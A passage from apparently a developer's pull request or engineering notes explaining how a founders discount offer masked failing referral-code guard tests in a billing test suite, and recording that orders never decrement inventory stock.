since — worse than the red suggested, because the red read as a plan problem
rather than as missing coverage.

The guards are plan-independent, so the suite belongs on the plan that is open.
That alone is not enough, and it is the part that made this a decision rather
than a rename: `foundersOffer.plan` is `essentielle`, and `stripe.ts` applies
the offer whenever slots remain **and no referral applied** (`isFounders`
requires `!isReferral`). On a case where the code is honoured the offer is
invisible; on a case where the code is refused it is decisive — the refused
referral falls through to the founders offer, the creation line is waived, and
the order comes to the annual maintenance alone instead of the list total. Half
the assertions would otherwise have measured the founders offer instead of the
guard they name.

This branch carried its own repair of that suite for one commit. #355 landed
the same two-part fix on `main` first, reached independently, and the merge
takes it: `main`'s version exhausts the ten founders slots only in the cases
that bill without a discount, which leaves the two « it left nothing behind »
assertions honest as written instead of needing to be rescoped by buyer
address. It is the better of the two, so this branch now changes that file not
at all. Recorded because the diagnosis is worth keeping even though the patch
is not: a suite can be red for a reason that conceals a second, larger one.

**Nothing decrements stock on an order.** Stock tracking, low-stock alerts and
auto-disable are real and propagate to Uber Eats and Deliveroo, but
`grep -c "stock" packages/convex-functions/src/orders.ts` returns 0: every
quantity is maintained by hand. There is also no `stockMovements` table, so there
is no consumption history and no input for any reorder logic. An inventory defect,
not a copy one.
